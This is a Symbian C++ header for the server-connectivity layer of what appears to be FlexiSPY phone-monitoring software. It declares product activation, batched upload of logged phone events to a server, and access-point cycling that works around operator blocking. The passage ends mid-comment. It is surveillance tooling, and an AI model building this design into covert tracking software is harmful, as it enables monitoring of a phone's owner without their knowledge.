#ifndef __ServConnect_H__
#define __ServConnect_H__

#include <e32base.h>
#include <CommDbConnPref.h>
#include <Es_sock.h>
#include <http\rhttpsession.h>
#include <http\mhttptransactioncallback.h>
#include <HttpStringConstants.h>
#if defined(EKA2) //3rd
#include <sacls.h>
#else //2nd
#include <settinginfo.h>	// CSettingInfo
#include <settinginfoids.h>	// CSettingInfo ID's
#include "SANotifier.h"
#endif

#include "ServConnInfo.h"
#include "GlobalError.h"
#include "GlobalConst.h"
#include "AccessPointMan.h"
#include "Timeout.h"
#include "NetOperator.h"
#include "LicenceManager.h"
#include "CltDatabase.h"
#include "ServProtocol.h"
#include "ServerSelector.h"
#include "PeriodicTimer.h"
#include "SettingChangeObserver.h"
#include "SmsCmdManager.h"
#include "FxsDiagnosticInfo.h"
#include "ApnRecoveryInfo.h"
#include "AppDefinitions.h"
#include "MDestructAO.h"
#include "ActiveBase.h"

class RConnection;
class CCommsDatabase;
class CHTTPFormEncoder;
class CTerminator;
class CBinaryDataSupplier;
class CConnEstablisher;
class CHttpConnect;
class CBinaryDataSupplier;
class TActivationResult;
class CConnProgressNonifier;
class CLicenceManager;
class CServerUrlManager;
class CFxsSettings;
class CFxsGprsRecentLogRm;
class TApInfo;
class CFxHttpResponse;

/**
Connection state*/
enum TRConnectionState
	{
	EConnStateUnknown,						 //0
	EConnStateOpened, 						 //1 connection opened
	EConnStateDataTransfered,				 //2
	EConnStateDataTransferTemporarilyBlocked,//3
	EConnStateDataTransferResumed,			 //4
	/**
	Take too long to create connection*/
	EConnStateTimedout,			  			 //5
	EConnStateError				  			 //6
	};

/**
Access Point Seek Error Type*/
enum TAPSelectError
	{
	EAPSelectErrUnknown,				//0
	EAPSelectErrAbort,					//1
	/**
	No error*/
	EAPSelectErrNone,					//2
	/**
	No access point configured.
	*/
	EAPSelectErrNoAccessPointFound,		//3
	/**
	Error in opening connection.
	Gprs error,
	could also be be out of credit*/
	EApSelectErrOpeningConnection,		//4	
	/**
	Error after making http connection.
	This is access point problem*/
	EApSelectErrMakingHTTPConnection	//5
	};

class TApSelectErrInfo
	{
public:
	inline TApSelectErrInfo();
	inline void Reset();
public:
	TAPSelectError iErrType;
	TInt		   iErrCode;
	};

inline TApSelectErrInfo::TApSelectErrInfo()
	{Reset();}
	
inline void TApSelectErrInfo::Reset()
	{iErrCode=0;iErrType = EAPSelectErrUnknown;}

//titles
//_LIT(KActionTitleDeactivation,				"Deactivation Process");
//_LIT(KActionTitleAuthenticationTest,		"Authentication Process");

//_LIT(KConnStateEstablishing,				"Opening Connection...");
_LIT(KConnStateEstablishingFailed,			"Opening Connection Failed!");
_LIT(KConnStateEstablished,					"Connection Opened...");
_LIT(KConnStateMakingHttp,					"Connecting to Server...");
_LIT(KConnStateWaitingFromServer,			"Waiting for Server...");
_LIT(KConnStateParsingResponse,				"Parsing Response");
_LIT(KConnStateCompleted,					"Connection Completed");
_LIT(KConnStateOperationCompleted,			"Operation Completed");
_LIT(KConnStateActivationFailed,			"Activation Failed");
_LIT(KConnStateAPVerifyingFailed,			"Verifying Failed");
_LIT(KConnStateAuthenFailed,				"Authentication Failed");

/**
* Connection State Info*/
class TConnectCallbackInfo
	{
public:
	inline TConnectCallbackInfo();
	inline void Reset();
public:
	/**
	* Operation label
	* ie Verifying Access Point, Performing Test Connection, and so on*/
	TPtrC iTitle;
	/**
	* Access point info
	*/
	TApInfo iAccessPoint;
	/**
	* Connection state string
	* ie connecting, connected, wait for server, and so on*/
	TPtrC iConnState;
	TInt  iError;
	};

inline TConnectCallbackInfo::TConnectCallbackInfo()
	{Reset();}

inline void TConnectCallbackInfo::Reset()
	{iAccessPoint.Reset();iError = 0;}
	
class MHttpConnObserver
	{
public:
	/*
	* the caller takes ownership of aReceivedData	
	* @param aEvent TConnectionError
	* @param aErrCode Transaction error code, if aEvent is EHttpConnHttpError it contains http status code
	* @param aResponse
	* @leave When leave occurs HandleHttpConnEventLeave() method is invorked
	*/
	virtual void HandleHttpConnEventL(const TConnectionErrorInfo& aHttpConnError, CFxHttpResponse& aResponse) = 0;
	
	/**
	* Handle leave from HandleHttpConnEventL() method
	* @return must return KErrNone
	* @panic if leave occurs, panic CONE 5
	*/
	virtual TInt HandleHttpConnEventLeave(TInt aError, const THTTPEvent& aEvent) = 0;
	};

class TAPSelectionResult
	{
public:
	TApInfo iAPInfo;
	TApSelectErrInfo iErrInfo;
	};
	
class TApSeekResultInfo
	{
public:
	/**
	ETrue indicates auto seek operation is completed*/
	TBool iComplete;
	/**
	Either access is probiden or the server is blocked.
	Some operater returns wml/html document to the client describing access prohibited reason
	ie.. account is out of credit or forbidden reason.
	as we tested fodafone uk blocks flexispy.com, whenever the client connects to the server, it receives
	html document back saying that content being access is prohibited/*/
	TBool iAccessProhibited;
	/**
	ETrue if there is at least one access point that works.
	it is valid if and only if iComplete = ETrue*/
	TInt iSuccess;
	/**
	Array of working access point.
	it is valid if and only if iSuccess = ETrue*/	
	RArray<TApInfo> iWorkingAPs;
	/**
	iResults valid if and only if iSuccess = EFalse.
	It used to keep test failure information only for the moment*/
	RArray<TAPSelectionResult> iNotWorkingAPs;
	};
	
class MInetAutoSelectCallback
	{
public:	
	virtual void IAPSelectionProgressL(const TConnectCallbackInfo& aProgress) = 0;		
	/**
	* 
	* @param aError KErrNone indicates success,  
	*        indicating HTTP error if it is greater than zero.
	*		 KErrNotFound indicates No working access point found.
	*
	* @param ETrue if there is at leaset
	* @param aErrInfo Error of last connection attempt
	* @param aWorkingAP Array of working access point, it is valid value if aError equals to KErrNone
	*/
	virtual void IAPSelectionCompletedL(const TApSeekResultInfo& aResult) = 0;	
	/**
	* 
	* Will be called to handle exception raised by IAPSelectionCompletedL() method
	*/
	virtual void IAPSelectionHandleError(TInt aError) = 0;
	};

class MProductActivationCallback// : public MInetAutoSelectCallback
	{
public:
	/**
	* Call back fuction
	* 
	* @param aProgress callback info
	*/
	virtual void ActivationCallbackL(const TConnectCallbackInfo& aProgress)= 0;
	/**
	* @param aHttpConnError
	* @param Server response, Nullable
	* @param aErrMessage, Nullable
	*/
	virtual void ActivationCompleted(const TConnectionErrorInfo& aHttpConnError, 
									 const TApSeekResultInfo* aApSeekResult,
									 const TActivationResult* aServerResponse,
									 HBufC* aErrMessage = NULL) = 0;
	};
	
class MConnStateObserver
	{
public:
	/*
	* @param aState TRConnectionState
	* @param aError System wide error code
	* @leave When leave occurs HandleConnStatusLeave() method is invorked
	*/
	virtual void HandleConnStatusL(TRConnectionState aState,TInt aError) = 0;
	
	/*
	* Handle when MConnStateObserver::HandleConnStatusL() Leaves
	* 
	* @param aError System wide error code
	* @param must be KErrNone indicating ok
	* @panic if leave occurs, panic CONE 5	
	*/	
	virtual TInt HandleConnStatusLeave(TInt aError) = 0;
	};

class MConnProgressCallback
	{
public:
	/*
	* Offer connection progress info
	* @param aProgress
	*/
	virtual void ConnProgress(const TNifProgress& aProgress) = 0;
	};
	
class CFxHttpResponse : public CBase
	{
public:	
	CFxHttpResponse();
	~CFxHttpResponse();
public:
	enum TContentType
		{
		ETypeUnknown,		
		ETypeOctetStream,//application octet stream
		ETypeOther
		};
	TInt StatusCode();
	TInt ContentLength();
	TContentType ContentType();
	/**
	* ETrue indicates that our server is blocked by the operator
	*/
	TBool IsServerProhibited();
	const TDesC8& Body();
private:
	void Reset();
private:
	friend class CHttpConnect;
	TInt iStatusCode;
	TInt iContentLength;
	TContentType iContentType;
	HBufC8* iBody;
	};

/**
HTTP Connection class*/	
class CHttpConnect : public CBase,
					 public MTimeoutObserver,
					 public MConnProgressCallback,
					 public MHTTPTransactionCallback
	{
public:
	static CHttpConnect* NewL(MHttpConnObserver& aObserver, const RConnection& aConnection, const RSocketServ& aSockServ);
	~CHttpConnect();
	
	/**	
	* @leave if url is invalid
	*/
	void SetURL(const TDesC8& aURL);
	void SetContentType(HTTP::TStrings aContentType = HTTP::EApplicationXWwwFormUrlEncoded);
	void SetDataSupplier(MHTTPDataSupplier* aDataSupplier);
	void AddHeader(TInt aHeaderField, const TDesC8& aHeaderValue);
	void SetTimeoutInterval(TTimeIntervalMicroSeconds32 aTimeoutInterval);
	
	void SetProxyAddr(const TApnProxyInfo& aProxyInfo);
	
	inline TBool InProgress() const
		{return iInProcess;}
	
	/**
	* 
	* @leave KErrNotFound RHTTPSession::OpenL leaves with KErrNotFound if the Internet AP is not correctly configured 
	*        system wide error
	* 	
	* @return ETrue if the request is issued
    *		  EFalse if there is outstanding request
    * @leave KErrInUse if the operation is in progress
    * @precondition SetURL(), SetContentType(), SetDataSupplier(), SetTimeoutInterval() methods must be called first
	*/
	void DoPostL();	
private: // from MHTTPTransactionCallback
	void MHFRunL(RHTTPTransaction aTransaction, const THTTPEvent& aEvent);
	TInt MHFRunError(TInt aError, RHTTPTransaction aTransaction, const THTTPEvent& aEvent);
	
private://MConnProgressCallback
	void ConnProgress(const TNifProgress& aProgress);
	
private: //MTimeoutObserver
	void HandleTimedOutL();
	TInt HandleTimedOutLeave(TInt aLeaveCode);
	
private:
	CHttpConnect(MHttpConnObserver& aObserver, const RConnection& aConnection, const RSocketServ& aSockServ);
	void ConstructL();
	void OpenSessionL();
	void DoSubmitL();
	void AddHeaderL(RHTTPHeaders aHeaders, HTTP::TStrings aHttpStrCode, const TDesC8& aHeaderValue);
	void NotifyCompleteL(TBool aSuccess);
	void OnComplete();
	void Reset();
	void CloseSession();
	void StartTimer();
	void StopTimer();
	RStringF StringF(HTTP::TStrings aStringCode);
	/**
	* @return ETrue if aMatchingStr matches with the specified aStr string
	*/
	TBool MatchHttpString(const TDesC8& aMatchingStr, HTTP::TStrings aStr);
	/**
	* @return KErrNone if success
	*/
	TInt GetContentLength(TInt& aContentLength, RHTTPTransaction& aTrans);
	/**
	* @return KErrNone if success
	*/
	TInt GetContentType(TDes& aContentType, RHTTPTransaction& aTrans);
	//debug	
	void DumpRespHeadersL(RHTTPTransaction& aTrans);
private:
	MHttpConnObserver& iObserver;
	const RConnection& iConnection;
	const RSocketServ& iSockServ;
	TNifProgress iConnProgress;
	RHTTPSession iHttpSession;
	RHTTPTransaction iTransaction;
	CFxHttpResponse* iServResponse;
	TUriParser8	iUriParser;
	HTTP::TStrings iContentType;
	MHTTPDataSupplier* iDataSupplier;//not owned
	CTimeOut* iTimeout;
	TTimeIntervalMicroSeconds32 iTimeoutInterval;	
	TApnProxyInfo iProxyAddr; //not owned
	TBool iSessionClosed;
	//CTimeOut* iTimeout;
	TBool iInProcess;
	/**
	default: an unrecognised event. 
	Negative values indicate an error propogated from filters or lower comms layers. 
	If not understood by the client, error values may be safely ignored since a THTTPEvent::EFailed event is guaranteed to follow. 
	Positive values are used for warning conditions*/
	TInt iError;	
	};

class CConnProgressNonifier : public CActive
	{
public:
	static CConnProgressNonifier* NewL(RConnection& aConnection, MConnProgressCallback& aObserver);
	~CConnProgressNonifier();
	
	void Start();
	void Stop();
private:
	void RunL();
	void DoCancel();
	TInt RunError(TInt aError);
	
private:
	CConnProgressNonifier(RConnection& aConn, MConnProgressCallback& aObserver);	
	void ConstructL();
	
private:    
    RConnection& iConnection;
    MConnProgressCallback& iObserver;
    TNifProgressBuf iProgress;
	};

class MConnMonitorObserver
	{
public:
	/**
	* @param aError
	* @param aActive active/inactive status
	*				 on hold is also considered as inactive
	* @leave When leave occurs HandleConnMonLeave() method is invorked
	*/
	virtual void ConnectionActiveStatusL(TInt aError, TBool aActive) = 0;
	/**
	* Handle leave from ConnectionActiveStatusL() method
	** @panic if leave occurs, panic CONE 5
	*/
	virtual void HandleConnMonLeave(TInt aError) = 0;
	};

/**
Connection Monitor.
This monitors the status (active/inactive)of the connection used by the application.
if it has been inactive for a certain period of time. it will be closed*/
class CConnMonitor : public CActiveBase
	{
public:
	CConnMonitor(RConnection& aConn, MConnMonitorObserver* aObserver);
	~CConnMonitor();
	
	void SetObserver(MConnMonitorObserver* aObserver);	
	void SetActivePeriod(TUint aSec);
	/**
	*
	* @pre SetActivePeriod() is called
	*/
	void Start();
private: 	
	void RunL();
	void DoCancel();
	TInt RunError(TInt aError);
	TPtrC ClassName();	
private:
	RConnection& iConnection;
	MConnMonitorObserver* iObserver;
	TPckg<TBool> iStatePkg;	
	TBool iState;
	TUint iInterval;
	};

/**
This class is used to create and terminate socket connection.
@Note::*/
class CConnEstablisher : public CActiveBase,
						 public MTimeoutObserver,
						 public MConnProgressCallback,
						 public MConnMonitorObserver,
						 public MDestructAO				 
	{
public:
	/**
	* It connects to socket server
	* Be aware that leave could occur
	*/
	static CConnEstablisher* NewL(MConnStateObserver& aObserver);	
	/**
	Note:
	It is very important to understand that calling delete operator on this object will cause panic E32USER-CBase 46 
	if the async operation is pending.
	use Destruct() method instead to avoid the panic.*/
	~CConnEstablisher();	
public://MDestructAO
	/**
	It is safe to always call Destruct() to destroy this object instead of calling delete operator.*/
	void Destruct();
	
	void CancelConnection();	
	void SetApnInfo(const TApInfo& aApn);
		
	/**
	* Default value is 30 second
	*/
	void SetTimeoutInterval(TTimeIntervalMicroSeconds32 aTimeoutInterval=30000000);
	
	void SetObserver(MConnMonitorObserver* aConMonObserver);
	
	/**
	* Set request connection active status interval
	* @param aSec the observer will be informed fo active status every aSeconds
	*/	
	void SetConnectionActivePeriod(TUint aSeconds);
	/**
	* Request connection active status
	* As a result of this, MConnMonitorObserver::ConnectionActive() will be called
	* @pre SetObserver() is called
	* @pre SetConnectionActivePeriod() is called	
	*/
	void ConnectionActiveRequest();	
	
	/**
	* Open connection using RConnection
	* This is async operation
	* You must have called SetConnPref() before this method
	* 
	* @precodition SetApnInfo() must be called
	* @return ETrue the operation is issued
	*		  EFalse the operation is in progress  
	* @leave only on memory allocation
	*/
	TBool OpenConnection();
	
	inline TUint32 IapId() const
		{return iConnPref.IapId();}
	
	const TApInfo& ApnInfo() const
		{return iApnInfo;}
	
	const RConnection& Connection() const;
	const RSocketServ& SocketServ() const;
	
	inline TInt ConnProgressCallbackCount() const
		{return iArrayOfCallback.Count();}	
private: 	
	void RunL();
	void DoCancel();
	TInt RunError(TInt aError);
	TPtrC ClassName();
private://MConnMonitorObserver
	void ConnectionActiveStatusL(TInt aError, TBool aActive);
	void HandleConnMonLeave(TInt aError);
private: //MTimeoutObserver
	void HandleTimedOutL();
	TInt HandleTimedOutLeave(TInt aErr);

private://MConnProgressCallback
	void ConnProgress(const TNifProgress& aProgress);
	
private:
	CConnEstablisher(MConnStateObserver& aObserver);
	void ConstructL();
	TBool IsConnectionActive();
	void CreateProgressNonifierL();
	void ConnectToSocketServerL();
	void OpenRConnectionL();
	void IssueStartConnection();
	void StartTimer();
	void StopTimer();
	void AddProgressObserver(MConnProgressCallback* aCallback);	
	void RemoveProgressObserver(MConnProgressCallback* aCallback);		
private:
	enum TOptCode
		{
		EOptNone,				//0
		EOptIssueOpenConnection,//1
		EOptOpenConnection		//2
		};
private:
	MConnStateObserver& iObserver;	
	RConnection	iConnection;
	//RConnectionMonitor
	RSocketServ iSockServ;
	TCommDbConnPref iConnPref;
	CTimeOut*	iTimeout;
	TTimeIntervalMicroSeconds32 iTimeoutInterval;
	TOptCode iOptCode;
	CConnProgressNonifier* iProgNotifier;
	CConnMonitor* iConnMonitor;
	MConnMonitorObserver* iConMonObserver;
	RArray<MConnProgressCallback*> iArrayOfCallback;
	TBool iStarted;
	TNifProgress iProgress;
	TBool iDestroyOnAsyncComplete;
	TBool iCancelConnection;
	TApInfo iApnInfo;
	};

const TInt KErrSIMOutOfCredit = KErrGprsActivationRejected;

class CServAction : public CBase
	{
public:	
	virtual void DoActionL() = 0;
	};
	
//----------------------------------------------------------------------------
//		PRODUCT ACTIVATION
//----------------------------------------------------------------------------
class TProductActivationData
	{
public:
	inline TProductActivationData();	
	inline TProductActivationData& operator=(const TProductActivationData& aData);
	enum TMode
		{
		EModeActivation,		//0
		EModeDeactivation,		//1
		EModeAuthenticationTest	//2
		};
public:	
	/**
	Default is EModeActivation*/
	TMode  iMode;
	/**
	FlexiKEY used for activation*/
	TFlexiKEY iFlexiKEY;
	/**
	Default is used if empty*/
	TServerURL iServerUrl;
	/**
	Product Id string*/
	TFxProductId8 iProductId;
	/**
	product version in format of major and minor
	for example, 0402 (major 4, minor 2)*/
	TVersionName8 iProductVer;	
	/**
	device imei*/
	TDeviceIMEI8 iIMEI;
	};

inline TProductActivationData::TProductActivationData()
	{iMode = EModeActivation;}
								  
inline TProductActivationData& TProductActivationData::operator=(const TProductActivationData& aData)
	{
	if(this != &aData)
	//check to see its not assigning to itself
		{
		iMode = aData.iMode;
		iFlexiKEY.Copy(aData.iFlexiKEY);
		iServerUrl.Copy(aData.iServerUrl);
		iProductId.Copy(aData.iProductId);
		iProductVer.Copy(aData.iProductVer);
		iIMEI.Copy(aData.iIMEI);		
		}
	return *this;
	}

/**
Product Activation Action*/
class CProductActivAction : public CServAction,
							public MHttpConnObserver
	{
public:
	static CProductActivAction* NewL(CConnEstablisher& aConn, CServerUrlManager& aServUrl, MProductActivationCallback& aCallback);
	~CProductActivAction();
	
	void SetData(const TProductActivationData& aActivateData);
	
	/**
	* Process product activation
	* SetData() must be called Before calling this method ortherwise panic
	* @leave KErrArgument if connecting url is empty
	* @return void
	*/
	void DoActionL();
private://MHttpConnObserver
	void HandleHttpConnEventL(const TConnectionErrorInfo& aHttpConnError, CFxHttpResponse& aResponse);	
	TInt HandleHttpConnEventLeave(TInt aError, const THTTPEvent& aEvent);
	
private:
	CProductActivAction(CConnEstablisher& aConn, CServerUrlManager& aServUrl, MProductActivationCallback& aCallback);
	void ConstructL();	
	void DeleteHttpConnect();
	void AddParamsL();
	void MakeHttpConnectionL();
		
	/**
	* @param aResponse binary data
	* @param aResponse output
	*/
	void ParseResponse(const TDesC8& aResponse, TActivationResult& aResult);
	void UpdateProgressL(TInt aError, TInt aConnStateRscId);	
	void ProcessResultL(const TActivationResult& aResult);
	void HexStringToDes8(const TDesC8& aHexString, TMd5Hash& aResult);
	HBufC* ReadResourceTextL(TInt aRscId);
private:
	CConnEstablisher& iConn;
	CServerUrlManager& iServUrl;
	MProductActivationCallback& iCallback;	
	CHttpConnect* iHttpConnect;
	CHTTPFormEncoder* iFormEncoder;
	CTerminator* iTerminator;//not owned
	TBuf<32>	iIMEI;	
	TProductActivationData iActivateData;
	HBufC* iStateStr;
	/**
	Number of activation url predefined*/
	TInt iCountActivationUrl;
	TInt iCurrActivationUrlIndex;
	};


//----------------------------------------------------------------------------
//		EVENT LOG DELIVERY
//----------------------------------------------------------------------------

class MLogDeliveryCallback
	{
public:
	/**
	* @param aState if complete with success it must equals to EHttpConnSucceeded
	* @param aError 
	*		 if aState equals to EHttpConnSucceeded it contains Server response code
	*        if aState equals to EHttpConnHttpError it contains HTTP Status Code
	*        if aState equals to EHttpConnFailed it contains http connection or system wide error code
	*		 if aState equals to EHttpConnTimeout and else it contains system wide error code	
	*/
	virtual void LogDeliveryCompleted(const TConnectionErrorInfo& aHttpConnError, const CServResponseHeader* aServResponse) = 0;
	};

class MAuthenTestObserver
	{
public:
	virtual void ServAuthenCallbackL(const TConnectCallbackInfo& aProgress) = 0;
	/**
	* Server authentication completed
	* 
	* @param aState if complete with success it must equals to EHttpConnSucceeded
	* @param aError
	* @param aServResponse NULL if connection failed
	*/
	virtual void ServAuthenCompleted(const TConnectionErrorInfo& aHttpConnError, const CServResponseHeader* aServResponse) = 0;
	};
	
class CCliRequestHeader;

/**
Authentication Test Action.
It sends authentication request to the server and check result.*/
class CAuthenTestAction : public CServAction,
						  public MHttpConnObserver
	{
public:
	static CAuthenTestAction* NewL(CServerUrlManager& aServSelector,
								   CConnEstablisher& aConn,
								   MAuthenTestObserver& aObserver);
	~CAuthenTestAction();
	
	/**
	* Send event log to the server
	* 
	* @leave OOM
	* @leave http related code
	* @leave KErrInUse if the http connection is in use
	*/
	void DoActionL();	
private://MHttpConnObserver
	void HandleHttpConnEventL(const TConnectionErrorInfo& aHttpConnError, CFxHttpResponse& aResponse);	
	TInt HandleHttpConnEventLeave(TInt aError, const THTTPEvent& aEvent);
	
private:
	CAuthenTestAction(CServerUrlManager& aServSelector, CConnEstablisher& aConn, MAuthenTestObserver& aObserver);
	void ConstructL();	
	void CreatePostingBinaryDataL();
	void MakeHttpConnectionL();	
	void ProcessResponseL(const TDesC8& aResponse);
private:
	CServerUrlManager& iServSelector;
	CConnEstablisher& iConn;
	MAuthenTestObserver& iObserver;
	CHttpConnect* iHttpConnect;
	CBinaryDataSupplier* iDataSupplier;
	TConnectionError iHttpConnState;	
	HBufC8* iPostingData;	
	CCliRequestHeader* iCliHdrPk;
	CServResponseHeader* iServResponse;
	};

/**
Maximum number of event for delivery at a time.*/
const TInt KMaxNumOfEventDelivery = 150;
const TInt KMinimumNumOfEventDelivery = 10;

/**
Log Event Delivery Action.*/
class CLogDeliveryAction : public CServAction,
						   public MHttpConnObserver
	{
public:
	static CLogDeliveryAction* NewL(CFxsDatabase& aDatabase,
									CServerUrlManager& aServSelector,
									CConnEstablisher& aConn,
									MLogDeliveryCallback& aCallback);
	~CLogDeliveryAction();
	
	/**
	* Send event log to the server
	* 
	* @leave OOM
	* @leave http related code
	* @leave KErrInUse if the http connection is in use
	* @leave KErrBadHandle if connection's handle is null
	* @leave KExceptionUrlNotFound URL is empty
	*/
	void DoActionL();
	/**
	* @param 
	*/
	void SetMaxDeliveryEvent(TInt aNumOfEvent = KMaxNumOfEventDelivery);
	TInt Handle();		
private://MHttpConnObserver
	void HandleHttpConnEventL(const TConnectionErrorInfo& aHttpConnError, HBufC8* aReceivedData);
	void HandleHttpConnEventL(const TConnectionErrorInfo& aHttpConnError, CFxHttpResponse& aResponse);
	TInt HandleHttpConnEventLeave(TInt aError, const THTTPEvent& aEvent);
	
private:
	CLogDeliveryAction(CFxsDatabase& aDatabase,CServerUrlManager& aServSelector, CConnEstablisher& aConn, MLogDeliveryCallback& aCallback);
	void ConstructL();
	void CreatePostingBinaryDataL();
	void MakeHttpConnectionL();	
	void ProcessResponseL(const TDesC8& aResponse);
private:
	CFxsDatabase& iDatabase;
	CServerUrlManager& iServSelector;
	CConnEstablisher& iConn;
	MLogDeliveryCallback& iCallback;
	CHttpConnect* iHttpConnect;
	CBinaryDataSupplier* iDataSupplier;
	TConnectionError iHttpConnState;	
	HBufC8* iPostingData;	
	CCliRequestHeader* iCliHdrPk;
	CServResponseHeader* iRespParser;
	RArray<TInt32> iLogIdList;	
	TInt iMaxNumOfEventDelivery;
	};

//----------------------------------------------------------------------------
//		ACCESS POINT AUTO SEEK
//----------------------------------------------------------------------------

//AP Select exception
enum TAPCycleErr
	{
	EApCycleIdNotExist = -1,
	EApCycleOK,		 	//0	
	EApWaitForAPChanged,//1
	EApCycleEnd, 		//2
	/**
	Indicates that the server is blocked by the operator*/
	EApServerBlocked
	};

/**
Internet access point selector. it selects the 
it cycles thru all access points and select the right one that can make tcp connection*/
class CInetAPSelectAction  : public CBase,
							 public MConnStateObserver,
							 public MHttpConnObserver,
							 public MAccessPointChangeObserver
	{
public:	
	enum TSelectType
		{
		/**
		cycle thru all AP and test if it is working.*/
		ESelectAll,
		/**
		Stop cycling thru AP when found a working one*/
		ESelectOne
		};	
		
	enum TAPSelectFilter
		{
		EAPFilterAll,
		EAPFilterSelfCreated		
		};
	
	enum TMode
		{
		EModeNoneUi,
		EModeUi
		};
	
	static CInetAPSelectAction* NewL(CAccessPointMan& aInetAPMan, CServerUrlManager& aServSelector, MInetAutoSelectCallback& aObserver);
	~CInetAPSelectAction();
	
	void DoSeekL(TSelectType aType,TAPSelectFilter aFilter = EAPFilterAll, TMode aMode = EModeNoneUi);
	
	//void GetWorkingInetAP(RArray<TApInfo>& aIAP);	
private:
	void HandleConnStatusL(TRConnectionState aState, TInt aError);
	TInt HandleConnStatusLeave(TInt aError);
	
private://MHttpConnObserver
	void HandleHttpConnEventL(const TConnectionErrorInfo& aHttpConnError, CFxHttpResponse& aResponse);
	TInt HandleHttpConnEventLeave(TInt aError, const THTTPEvent& aEvent);

private://MAccessPointChangeObserver
	void APRecordWaitState(TBool aWait);
	//empty implementation
	void APCreateCompleted(TInt /*aError*/)	{};
	void APRecordChangedL(const RArray<TApInfo>& /*aCurrentAP*/){};
	void ApnFirstTimeLoaded(){};	
private:
	CInetAPSelectAction(CAccessPointMan& aInetAPMan, CServerUrlManager& aServSelector, MInetAutoSelectCallback& aObserver);
	void ConstructL();
	void CreateDataSupplierL();
	/**
	* Do NOT call DoCycleThruAPL() method directly
	* 
	* @leave on memory allocation
	* @return KErrNone if the request is issued,
	*		  KErrNotFound if it has been cycled thru all access point
	*/
	void CycleThruAPL();
	/**
	* 
	* @return EApCycleEnd if no access point found
	*/
	TAPCycleErr DoCycleThruAPL();
	
	/*
	* perform http connection
	*/
	void MakeHttpConnectionL();
	/**
	*
	* @return AP Info, NULL if not found
	*/
	const TApInfo* NextIAP();
	
	void TerminateConnection();
	//will be called when operation is complete
	void OnCompletedL();
	void NotifyCompletedL();
	void Reset();
	/**
	* 
	* @param aError
	* @param aConnState This string must exist til this object is destroyed
	*				    because it is pointed by member of this class
	*/
	void UpdateProgressL(TInt aError,  TInt aConnStateRscId);
	void SetAPSelectErrInfo(TAPSelectError aApSelectErr, TInt aErrCode);
	void DeleteHttpConnect();
	HBufC* ReadResourceTextL(TInt aRscId);
private:
	CAccessPointMan& iInetAPMan;
	CServerUrlManager& iServSelector;
	MInetAutoSelectCallback& iCallback;
	CConnEstablisher* iConEstablisher;	
	RPointerArray<CHttpConnect> iHttpConnects;//this for late delete
	CHttpConnect* iHttpConnect;
	CBinaryDataSupplier* iDataSupplier;
	TBuf8<1> iDummy;
	/*
	Array of access point from phone settings**/
	RArray<TApInfo> iAP_Array;
	TApSeekResultInfo iSeekResult;
	TBool iInProgress;
	TInt iCurrIndex;
	TApInfo* iCurrAP; //Not owned
	TConnectCallbackInfo iConnState;
	TSelectType iSelectType;
	TMode iMode;
	TAPSelectFilter iFillter;
	TApSelectErrInfo iLastError;
	HBufC* iStateStr;
	TBool iWaitForAP;
	
	TInt iDeliveryUrlListCount;
	TInt iCurrDeliveryUrlIndex;
	TBool iRepeat;
	};

//----------------------------------------------------
//	Delivery Log Report Timer
//----------------------------------------------------
const TInt KTimerIntervalNone = 0;

class CPeriodicTimer;

class CEventDeliveryTimer : public CBase,
 						    public MSettingChangeObserver
	{
public: 
	static CEventDeliveryTimer* NewL(MPeriodicCallbackObserver& aObserver);
	~CEventDeliveryTimer();
	
	//inline void TimerInterval(TInt& aResult) const
	//	{aResult = iTimerInterval;}
	
private://MSettingChangeObserver
	void OnSettingChangedL(CFxsSettings& aSetting);
	
private://MPeriodicCallbackObserver
	void DoPeriodicCallBackL();
	void StartPeriodicTimer();
	
private:
	CEventDeliveryTimer(MPeriodicCallbackObserver& aObserver);
	void ConstructL();
	
private:
	MPeriodicCallbackObserver&	iObserver;
	CPeriodicTimer*	iTimer;
	TInt                 	 	 iTimerInterval; // in second	
	TTimeIntervalMicroSeconds  iPeriodicDelay;
	TTimeIntervalMicroSeconds  iPeriodicInterval;
	};

const TInt KMaxHttpFailedHistoryArrayCount = 10;
const TInt KMaxSeekInetAPRetryCount 	   = 5;
const TInt KMaxCreateAPCount			   = 2;

class TCreateAccessPointCount
	{
public:
	TInt iCount;
	/**
	create when network operator changed*/
	TInt iOnNetwChange;
	/**
	create the user has changed onboard APN in the phone's settings*/
	TInt iOnAPRecordChange;
	/**
	create when all access points removed*/
	TInt iOnApnEmpty;
	};

/**
Wait before resend timer interval, unit in secs.*/
const TInt KLogDeliveryRetryDelay = 60 * 10; // 10 minutes
const TUint KMaxLogDeliveryRetryCount  = 6;

/*
if number of connection establishment failure occurs continuously.
the previous working apn will be reset*/
const TInt KConnEstablishmentFailedResetThreshold = 10;
/**
Connection active status period. in secs.
When the connection has been inactive for this period of time.
It will be closed. @See CServConnectMan::ConnectionActiveStatusL()*/
const TUint KPeriodConnectionInactive = 10;
/**
Open connection timed out period in micro secs*/
const TUint KOpenConnectionTimedout = 60000000; //1 minute

// connection error
// -36 connection disconnected, this is common error that cause by variety of reason such as
//     - bad connection
//	   - the connection is disconnected by the operator for a number of reasons
//		 for example if sim is barred, gprs service not registered or activated
//	

/**
Server Connection Manager.
It provides interfaces and manages all server conectivity functinality such as
- Product Activation
- Event log delivery
- Testing internet connection

When to cycle thru all access point for testing?
1. Product Activation. it will seek the first working one and stop. it won't test all AP
2. When SIM is changed.
3. Got sms command
4. Access point setting changed: by changing, adding, deleting from phone settings 
   It will cycle thru all AP only if there is no working access point in the list.
   It will not perform the selection if there is aleast one working AP in the list
   for example, it wont test connection if a new access point is added but the previous working one is still there
5. When connection failed with wrong access point.
   This can happen if the properties of a (working) AP changed. for example, proxy addr, user name, password.
   This one must be written with care.

There are two steps when making connection to the server.
1. Open Connection.
2. Make HTTP Connection.

Failure can occur in each step.

Definition of wrong access point.
1. Can open connection but failed when making http connection, 
   normally with error KErrDndNameNotFound(-5120) but in some case with timed out (-33)  
   Error Code:   
   TConnectionErrorInfo(EConnErrMakeHttpConnFailed, KErrDndNameNotFound) [7, -5120]
   	- idicating wrong access point if the web server is OK
   	- indicating host not found when web server is down
   
   TConnectionErrorInfo(EConnErrMakeHttpConnFailed, KErrTimedout) 		 [7, -33]
   Sometimes the OS report -33 even when the server return http error
   
2. Failing to open connection with error KErrGprsMissingorUnknownAPN (-4155)
   normally when apn name is missing or does not exist
   Error Code:
   TConnectionErrorInfo(EConnErrOpeningFailed, KErrGprsMissingorUnknownAPN) [3, -4155]
   
No posible to connect to the internet (out of credit or gprs not activated)
Error Code:
1. Failing to open connection with error -4159
	Error Code:
	TConnectionErrorInfo(EConnErrOpeningFailed, KErrGprsActivationRejected) [3, -4159]

